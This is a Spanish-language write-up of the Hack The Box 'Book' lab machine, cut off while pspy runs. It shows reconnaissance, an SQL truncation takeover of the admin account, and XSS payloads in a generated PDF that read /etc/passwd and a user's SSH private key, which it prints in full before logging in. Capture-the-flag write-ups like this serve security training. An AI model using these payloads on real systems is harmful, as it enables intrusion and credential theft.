<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>            Hack The Box Book - K4miyo      Ciberseguridad!      </title>
<meta name="description" content="Resolución de la máquina Book en la plataforma de Hack The Box">



<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="K4miyo | Ciberseguridad!">
<meta property="og:title" content="Hack The Box Book">
<meta property="og:url" content="http://localhost:4000/htb-book/">


  <meta property="og:description" content="Resolución de la máquina Book en la plataforma de Hack The Box">



  <meta property="og:image" content="http://localhost:4000/assets/images/htb-book/book.jpg">





  <meta property="article:published_time" content="2022-01-28T00:00:00-06:00">





  

  


<link rel="canonical" href="http://localhost:4000/htb-book/">







  <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Person",
      "name": "K4miyo",
      "url": "http://localhost:4000",
      "sameAs": null
    }
  </script>







<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="K4miyo | Ciberseguridad! Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE ]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
                
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/" >Home</a>
            </li><li class="masthead__menu-item">
              <a href="/year-archive/" >Artículos</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/" >Categorías</a>
            </li><li class="masthead__menu-item">
              <a href="/tags/" >Etiquetas</a>
            </li><li class="masthead__menu-item">
              <a href="/buscador/" >Buscador</a>
            </li><li class="masthead__menu-item">
              <a href="/about/" >Contacto</a>
            </li></ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>
    

    <div class="initial-content">
      


  
    



<nav class="breadcrumbs">
  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
    
    
    
      
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
          <meta itemprop="position" content="1" />
        </li>
        <span class="sep">/</span>
      
      
        <li class="current">Hack The Box Book</li>
      
    
  </ol>
</nav>

  


<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      

      
        <img src="/assets/images/avatar.png" alt="K4miyo" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">K4miyo</h3>
    
    
      <p class="author__bio" itemprop="description">
        Cyber Threat Intelligence Analyst
      </p>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      

      

      

      

      

      

      

      

      

      

      

      

      

      
        <li>
          <a href="https://github.com/k4miyo" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
          </a>
        </li>
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Hack The Box Book">
    <meta itemprop="description" content="Resolución de la máquina Book en la plataforma de Hack The Box">
    <meta itemprop="datePublished" content="January 28, 2022">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">Hack The Box Book
</h1>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
        <p class="page__meta">
          
            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2022-01-28T00:00:00-06:00">January 28, 2022 </time>&emsp;
          
          
        </p>
        <p><img src="/assets/images/htb-book/banner-book.jpg" alt="" /></p>

<h2 id="book">Book</h2>
<p>Se procede con la fase de reconocimiento lanzando primeramente un <code class="language-plaintext highlighter-rouge">ping</code> a la dirección IP 10.10.10.176.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 10.10.10.176
PING 10.10.10.176 <span class="o">(</span>10.10.10.176<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
64 bytes from 10.10.10.176: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>63 <span class="nb">time</span><span class="o">=</span>141 ms

<span class="nt">---</span> 10.10.10.176 ping statistics <span class="nt">---</span>
1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
rtt min/avg/max/mdev <span class="o">=</span> 140.520/140.520/140.520/0.000 ms
</code></pre></div></div>

<p>De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de <code class="language-plaintext highlighter-rouge">nmap</code> para determinar los puertos abiertos de la máquina y exportanto la información al archivo <strong>allPorts</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-T5</span> <span class="nt">-v</span> <span class="nt">-n</span> 10.10.10.176 <span class="nt">-oG</span> allPorts
Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-01-23 16:18 CST
Initiating Ping Scan at 16:18
Scanning 10.10.10.176 <span class="o">[</span>4 ports]
Completed Ping Scan at 16:18, 0.16s elapsed <span class="o">(</span>1 total hosts<span class="o">)</span>
Initiating SYN Stealth Scan at 16:18
Scanning 10.10.10.176 <span class="o">[</span>65535 ports]
Discovered open port 80/tcp on 10.10.10.176
Discovered open port 22/tcp on 10.10.10.176
Completed SYN Stealth Scan at 16:19, 36.12s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
Nmap scan report <span class="k">for </span>10.10.10.176
Host is up <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65533 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>36.42 seconds
           Raw packets sent: 68980 <span class="o">(</span>3.035MB<span class="o">)</span> | Rcvd: 68908 <span class="o">(</span>2.756MB<span class="o">)</span>
</code></pre></div></div>

<p>Mediante la función <a href="/extractPorts">extractPorts</a> definida a nivel de <code class="language-plaintext highlighter-rouge">zsh</code> , se obtiene la información más relevante de la captura grepeable.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯  extractPorts allPorts
───────┬─────────────────────────────────────
       │ File: extractPorts.tmp
───────┼─────────────────────────────────────
   1   │ 
   2   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Extracting information...
   3   │ 
   4   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> IP Address: 10.10.10.176
   5   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> Open ports: 22,80
   6   │ 
   7   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Ports copied to clipboard
</code></pre></div></div>

<p>A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80 10.10.10.176 <span class="nt">-oN</span> targeted
Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-01-23 16:21 CST
Nmap scan report <span class="k">for </span>10.10.10.176
Host is up <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 f7:fc:57:99:f6:82:e0:03:d6:03:bc:09:43:01:55:b7 <span class="o">(</span>RSA<span class="o">)</span>
|   256 a3:e5:d1:74:c4:8a:e8:c8:52:c7:17:83:4a:54:31:bd <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 e3:62:68:72:e2:c0:ae:46:67:3d:cb:46:bf:69:b9:6a <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not <span class="nb">set</span>
|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: LIBRARY - Read | Learn | Have Fun
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>12.36 seconds
</code></pre></div></div>

<p>Tenemos el puerto 80 abierto, por lo que antes de ver el contenido vía web, vamos a ver a lo que nos enfrentamos con <code class="language-plaintext highlighter-rouge">whatweb</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ whatweb http://10.10.10.176/
http://10.10.10.176/ <span class="o">[</span>200 OK] Apache[2.4.29], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)]</span>, IP[10.10.10.176], PasswordField[password], Script, Title[LIBRARY - Read | Learn | Have Fun]
</code></pre></div></div>

<p>No vemos nada interesante, así que ahora si vamos vía web.</p>

<p><img src="/assets/images/htb-book/book-web.png" alt="" /></p>

<p>Nos encontramos con un panel de login y vemos también la posiblidad de registrarnos; asi que antes de intentar algo, vamos a registrarnos y ver a lo que tenemos acceso.</p>

<p><img src="/assets/images/htb-book/book-web1.png" alt="" /></p>

<p>Notamos que en <strong>Collections</strong> podemos subir recursos; pero por el momento vamos a mantener esto en standby y vamos a tratar de obtener la cuenta de un usuario administrador y esto lo haremos dentro del panel de registro, vamos a poner en el campo <strong>email: admin@book.htb</strong>, ya que vamos a suponer que el usuario es admin y el dominio igual al nombre de la máquina con terminación <strong>htb - Hack The Box</strong>.</p>

<p><img src="/assets/images/htb-book/book-web3.png" alt="" /></p>

<p><img src="/assets/images/htb-book/book-web2.png" alt="" /></p>

<p>El usuario existe y además si vemos dentro del código fuente del panel de login, vemos que los campos <strong>name</strong> y <strong>email</strong> sólo pueden tomar una longitud de 10 caracteres y, el <strong>password</strong> tiene un máximo de 20 caracteres. Por lo tanto, algo que podríamos probar sería tratar de realizar <a href="https://linuxhint.com/sql-truncation-attack/">SQL Truncation</a>, es decir, ocupar el email de administrador y al final agregar muchos espacios en blanco y al final cualquier cosa, por ejemplo un “1”; ésto lo realizaremos a traves de la herramienta <strong><em>Burp Suite</em></strong>.</p>

<p><img src="/assets/images/htb-book/book-burp.png" alt="" /></p>

<p>Ahora vamos a tratar de loguearnos con el email <strong>admin@book.htb</strong> y la contraseña que hemos definido, que para este caso es <strong>admin123</strong>.</p>

<p><img src="/assets/images/htb-book/book-web4.png" alt="" /></p>

<p>Hemos modificado la contraseña del usuario <strong>admin</strong> y hemos ingresado; sin embargo, el contenido es el mismo que como un usuario normal, por lo que podríamos pensar que debe existir un recurso que nos lleve a un panel de administración y para encontrarlo, vamos a utilizar <code class="language-plaintext highlighter-rouge">nmap</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">--script</span> http-enum <span class="nt">-p80</span> 10.10.10.176
Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-01-23 18:01 CST
Nmap scan report <span class="k">for </span>10.10.10.176
Host is up <span class="o">(</span>0.15s latency<span class="o">)</span><span class="nb">.</span>

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /admin/: Possible admin folder
|_  /admin/index.php: Possible admin folder

Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>13.61 seconds
</code></pre></div></div>

<p>Es correcto, encontramos un recurso bajo <code class="language-plaintext highlighter-rouge">/admin/</code> en donde posiblemente se tenga un panel y podemos acceder como administrador.</p>

<p><img src="/assets/images/htb-book/book-web5.png" alt="" /></p>

<p>Ingresamos con las credenciales que tenemos <strong>admin@book.htb : admin123</strong>:</p>

<p><img src="/assets/images/htb-book/book-web6.png" alt="" /></p>

<p>Entramos al panel de login y si accedemos a la parte de <strong>Collections</strong> vemos algo diferente:</p>

<p><img src="/assets/images/htb-book/book-web7.png" alt="" /></p>

<p>Algo que podríamos probar sería tratar de subir un archivo txt como el usuario normal y luego ver que pasa con el archivo pdf de <strong>Collections</strong> como usuario admin.</p>

<p><img src="/assets/images/htb-book/book-pdf.png" alt="" /></p>

<p>Vemos que la informaicón que ponemos en los campos <strong>Book Title</strong> y <strong>Author</strong> como un usuario normal, se reflejan dentro del archivo pdf de <strong>Collections</strong> del usuario <strong>admin</strong>; por lo que si buscamos un poco, encontramos <a href="https://blog.noob.ninja/local-file-read-via-xss-in-dynamically-generated-pdf/">Local file read via xss in dynamically generated pdf</a> y tenemos una forma de poder listar archivos del sistema insertando la instrucción <code class="language-plaintext highlighter-rouge">&lt;script&gt;x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();&lt;/script&gt;</code>. Así que vamos a probar.</p>

<p><img src="/assets/images/htb-book/book-pdf1.png" alt="" /></p>

<p>Vemos el archivo <code class="language-plaintext highlighter-rouge">/etc/passwd</code>, por lo que podemos visualizar el contenido de archivos internos del sistema; por lo tanto, algo que podriamos intentar hacer es tratar de leer el archivo <code class="language-plaintext highlighter-rouge">id_rsa</code> del usuario <strong>reader</strong> y suponiendo que se encuentra bajo al ruta <code class="language-plaintext highlighter-rouge">/home/reader/.ssh/id_rsa</code>. Ejecutaríamos la siguiente instrucción en los campos <strong>Book Title</strong> y <strong>Author</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script&gt;x<span class="o">=</span>new XMLHttpRequest<span class="p">;</span>x.onload<span class="o">=</span><span class="k">function</span><span class="o">(){</span>document.write<span class="o">(</span>this.responseText<span class="o">)}</span><span class="p">;</span>x.open<span class="o">(</span><span class="s2">"GET"</span>,<span class="s2">"file:///home/reader/.ssh/id_rsa"</span><span class="o">)</span><span class="p">;</span>x.send<span class="o">()</span><span class="p">;</span>&lt;/script&gt;
</code></pre></div></div>

<p><img src="/assets/images/htb-book/book-pdf2.png" alt="" /></p>

<p>Tenemos la <code class="language-plaintext highlighter-rouge">id_rsa</code> del usuario <strong>reader</strong>, por lo que generamos un archivo que se llame <code class="language-plaintext highlighter-rouge">id_rsa</code> cuyo contenido es el que vemos en el pdf, le asignamos permiso 600 y procedemos a conectarnos por ssh a la máquina:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>id_rsa
───────┬────────────────────────────────────────────────────────────────────
       │ File: id_rsa
───────┼────────────────────────────────────────────────────────────────────
   1   │ <span class="nt">-----BEGIN</span> RSA PRIVATE KEY-----
   2   │ MIIEpQIBAAKCAQEA2JJQsccK6fE05OWbVGOuKZdf0FyicoUrrm821nHygmLgWSpJ
   3   │ G8m6UNZyRGj77eeYGe/7YIQYPATNLSOpQIue3knhDiEsfR99rMg7FRnVCpiHPpJ0
   4   │ WxtCK0VlQUwxZ6953D16uxlRH8LXeI6BNAIjF0Z7zgkzRhTYJpKs6M80NdjUCl/0
   5   │ ePV8RKoYVWuVRb4nFG1Es0bOj29lu64yWd/j3xWXHgpaJciHKxeNlr8x6NgbPv4s
   6   │ 7WaZQ4cjd+yzpOCJw9J91Vi33gv6+KCIzr+TEfzI82+hLW1UGx/13fh20cZXA6PK
   7   │ 75I5d5Holg7ME40BU06Eq0E3EOY6whCPlzndVwIDAQABAoIBAQCs+kh7hihAbIi7
   8   │ 3mxvPeKok6BSsvqJD7aw72FUbNSusbzRWwXjrP8ke/Pukg/OmDETXmtgToFwxsD+
   9   │ McKIrDvq/gVEnNiE47ckXxVZqDVR7jvvjVhkQGRcXWQfgHThhPWHJI+3iuQRwzUI
  10   │ tIGcAaz3dTODgDO04Qc33+U9WeowqpOaqg9rWn00vgzOIjDgeGnbzr9ERdiuX6WJ
  11   │ jhPHFI7usIxmgX8Q2/nx3LSUNeZ2vHK5PMxiyJSQLiCbTBI/DurhMelbFX50/owz
  12   │ 7Qd2hMSr7qJVdfCQjkmE3x/L37YQEnQph6lcPzvVGOEGQzkuu4ljFkYz6sZ8GMx6
  13   │ GZYD7sW5AoGBAO89fhOZC8osdYwOAISAk1vjmW9ZSPLYsmTmk3A7jOwke0o8/4FL
  14   │ E2vk2W5a9R6N5bEb9yvSt378snyrZGWpaIOWJADu+9xpZScZZ9imHHZiPlSNbc8/
  15   │ ciqzwDZfSg5QLoe8CV/7sL2nKBRYBQVL6D8SBRPTIR+J/wHRtKt5PkxjAoGBAOe+
  16   │ SRM/Abh5xub6zThrkIRnFgcYEf5CmVJX9IgPnwgWPHGcwUjKEH5pwpei6Sv8et7l
  17   │ skGl3dh4M/2Tgl/gYPwUKI4ori5OMRWykGANbLAt+Diz9mA3FQIi26ickgD2fv+V
  18   │ o5GVjWTOlfEj74k8hC6GjzWHna0pSlBEiAEF6Xt9AoGAZCDjdIZYhdxHsj9l/g7m
  19   │ Hc5LOGww+NqzB0HtsUprN6YpJ7AR6+YlEcItMl/FOW2AFbkzoNbHT9GpTj5ZfacC
  20   │ hBhBp1ZeeShvWobqjKUxQmbp2W975wKR4MdsihUlpInwf4S2k8J+fVHJl4IjT80u
  21   │ Pb9n+p0hvtZ9sSA4so/DACsCgYEA1y1ERO6X9mZ8XTQ7IUwfIBFnzqZ27pOAMYkh
  22   │ sMRwcd3TudpHTgLxVa91076cqw8AN78nyPTuDHVwMN+qisOYyfcdwQHc2XoY8YCf
  23   │ tdBBP0Uv2dafya7bfuRG+USH/QTj3wVen2sxoox/hSxM2iyqv1iJ2LZXndVc/zLi
  24   │ 5bBLnzECgYEAlLiYGzP92qdmlKLLWS7nPM0YzhbN9q0qC3ztk/+1v8pjj162pnlW
  25   │ y1K/LbqIV3C01ruxVBOV7ivUYrRkxR/u5QbS3WxOnK0FYjlS7UUAc4r0zMfWT9TN
  26   │ nkeaf9obYKsrORVuKKVNFzrWeXcVx+oG3NisSABIprhDfKUSbHzLIR4<span class="o">=</span>
  27   │ <span class="nt">-----END</span> RSA PRIVATE KEY-----
───────┴─────────────────────────────────────────────────────────────────────
❯ <span class="nb">chmod </span>600 id_rsa
❯ ssh <span class="nt">-i</span> id_rsa reader@10.10.10.176
The authenticity of host <span class="s1">'10.10.10.176 (10.10.10.176)'</span> can<span class="s1">'t be established.
ECDSA key fingerprint is SHA256:QRw8pCXg7E8d9sWI+0Z9nZxClJiq9/eAeT/9wUfoQQk.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span>10.10.10.176<span class="s1">' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 5.4.1-050401-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Jan 24 00:35:38 UTC 2022

  System load:  0.0               Processes:             209
  Usage of /:   52.5% of 5.77GB   Users logged in:       0
  Memory usage: 12%               IP address for ens160: 10.10.10.176
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

109 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Wed Jan 29 13:03:06 2020 from 10.10.14.3
reader@book:~$ whoami
reader
reader@book:~$
</span></code></pre></div></div>

<p>Ya nos encontramos dentro de la máquina como el usuario <strong>reader</strong> y podemos visualizar la flag (user.txt). Ahora vamos a enumerar un poco el sistema para ver de que forma podemos escalar privilegios.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reader@book:~<span class="nv">$ </span><span class="nb">id                                               
</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>reader<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>reader<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>reader<span class="o">)</span>
reader@book:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>                                          
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>reader:                                     
reader@book:~<span class="nv">$ </span><span class="nb">cd</span> /          
reader@book:/<span class="nv">$ </span>find <span class="se">\-</span>perm <span class="nt">-4000</span> 2&gt;/dev/null
./snap/core/8592/bin/mount
./snap/core/8592/bin/ping
./snap/core/8592/bin/ping6
./snap/core/8592/bin/su
./snap/core/8592/bin/umount
./snap/core/8592/usr/bin/chfn
./snap/core/8592/usr/bin/chsh
./snap/core/8592/usr/bin/gpasswd 
./snap/core/8592/usr/bin/newgrp
./snap/core/8592/usr/bin/passwd
./snap/core/8592/usr/bin/sudo
./snap/core/8592/usr/lib/dbus-1.0/dbus-daemon-launch-helper
./snap/core/8592/usr/lib/openssh/ssh-keysign
./snap/core/8592/usr/lib/snapd/snap-confine
./snap/core/8592/usr/sbin/pppd
./snap/core/11316/bin/mount
./snap/core/11316/bin/ping
./snap/core/11316/bin/ping6
./snap/core/11316/bin/su
./snap/core/11316/bin/umount
./snap/core/11316/usr/bin/chfn
./snap/core/11316/usr/bin/chsh
./snap/core/11316/usr/bin/gpasswd
./snap/core/11316/usr/bin/newgrp 
./snap/core/11316/usr/bin/passwd 
./snap/core/11316/usr/bin/sudo
./snap/core/11316/usr/lib/dbus-1.0/dbus-daemon-launch-helper
./snap/core/11316/usr/lib/openssh/ssh-keysign
./snap/core/11316/usr/lib/snapd/snap-confine
./snap/core/11316/usr/sbin/pppd
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/snapd/snap-confine
./usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/lib/openssh/ssh-keysign
./usr/lib/eject/dmcrypt-get-device
./usr/bin/chfn
./usr/bin/at
./usr/bin/passwd
./usr/bin/pkexec
./usr/bin/gpasswd
./usr/bin/chsh
./usr/bin/newgrp
./usr/bin/newgidmap
./usr/bin/newuidmap
./usr/bin/sudo
./usr/bin/traceroute6.iputils
./bin/mount
./bin/umount
./bin/fusermount
./bin/ping
./bin/su
reader@book:/<span class="nv">$ </span><span class="nb">uname</span> <span class="nt">-a</span>
Linux book 5.4.1-050401-generic <span class="c">#201911290555 SMP Fri Nov 29 11:03:47 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span>
reader@book:/<span class="nv">$ </span>lsb_release <span class="nt">-a</span>
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 18.04.2 LTS
Release:        18.04
Codename:       bionic
reader@book:/<span class="err">$</span>
</code></pre></div></div>

<p>Nos vemos nada interesante, así que vamos a tratar de buscar tareas que se ejecutan en intervalos regulares y lo haremos con <a href="https://github.com/DominicBreuker/pspy">pspy</a>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ git clone https://github.com/DominicBreuker/pspy
Clonando en <span class="s1">'pspy'</span>...
remote: Enumerating objects: 1087, <span class="k">done</span><span class="nb">.</span>
remote: Counting objects: 100% <span class="o">(</span>61/61<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
remote: Compressing objects: 100% <span class="o">(</span>37/37<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
remote: Total 1087 <span class="o">(</span>delta 31<span class="o">)</span>, reused 37 <span class="o">(</span>delta 21<span class="o">)</span>, pack-reused 1026
Recibiendo objetos: 100% <span class="o">(</span>1087/1087<span class="o">)</span>, 9.28 MiB | 8.89 MiB/s, listo.
Resolviendo deltas: 100% <span class="o">(</span>483/483<span class="o">)</span>, listo.
❯ <span class="nb">cd </span>pspy/
❯ <span class="nv">GOOS</span><span class="o">=</span>linux <span class="nv">GOARCH</span><span class="o">=</span>amd64 go build <span class="nt">-ldflags</span> <span class="s2">"-s -w"</span>
❯ file pspy
pspy: ELF 64-bit LSB executable, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, Go <span class="nv">BuildID</span><span class="o">=</span>obZo4Q7h3Sz8tBHv4dn4/Aa9VErfRGINSQDhJxKet/1TfDYPfSRgCQEU8fQCNJ/ENOF6bpj1-VeEB1LVfRO, stripped
❯ <span class="nb">du</span> <span class="nt">-hc</span> pspy
2.7M    pspy
2.7M    total
❯ upx brute pspy
                       Ultimate Packer <span class="k">for </span>eXecutables
                          Copyright <span class="o">(</span>C<span class="o">)</span> 1996 - 2020
UPX 3.96        Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Jan 23rd 2020

        File size         Ratio      Format      Name
   <span class="nt">--------------------</span>   <span class="nt">------</span>   <span class="nt">-----------</span>   <span class="nt">-----------</span>
upx: brute: FileNotFoundException: brute: No such file or directory
   2748416 -&gt;   1059492   38.55%   linux/amd64   pspy                          

Packed 1 file.
❯ <span class="nb">du</span> <span class="nt">-hc</span> pspy
1.1M    pspy
1.1M    total
</code></pre></div></div>

<p>Transferimos el archivo <code class="language-plaintext highlighter-rouge">pspy</code> a la máquina víctima en un directorio donde tengamos permisos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
10.10.10.176 - - <span class="o">[</span>23/Jan/2022 22:28:38] <span class="s2">"GET /pspy HTTP/1.1"</span> 200 -
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reader@book:~<span class="nv">$ </span><span class="nb">cd</span> /dev/shm/
reader@book:/dev/shm<span class="nv">$ </span>wget http://10.10.14.27/pspy
<span class="nt">--2022-01-24</span> 04:28:30--  http://10.10.14.27/pspy
Connecting to 10.10.14.27:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1059492 <span class="o">(</span>1.0M<span class="o">)</span> <span class="o">[</span>application/octet-stream]
Saving to: ‘pspy’

pspy                             100%[<span class="o">=======================================================&gt;]</span>   1.01M  1.13MB/s    <span class="k">in </span>0.9s    

2022-01-24 04:28:32 <span class="o">(</span>1.13 MB/s<span class="o">)</span> - ‘pspy’ saved <span class="o">[</span>1059492/1059492]

reader@book:/dev/shm<span class="err">$</span>
</code></pre></div></div>

<p>Le damos permisos de ejecución y lo corremos.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reader@book:/dev/shm<span class="nv">$ </span><span class="nb">chmod</span> +x pspy 
reader@book:/dev/shm<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
total 1036
<span class="nt">-rwxrwxr-x</span> 1 reader reader 1059492 Jan 24 00:53 pspy
reader@book:/dev/shm<span class="nv">$ </span>./pspy                                                                                                     
pspy - version:  - Commit SHA:                                                                                                   
                                                                                                                                 
                                                                                                                                 
     ██▓███    ██████  ██▓███ ▓██   ██▓                                                                                          
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒                                                                                          
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░                                                                                          
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░                                                                                          
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░                                                                                          
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒         
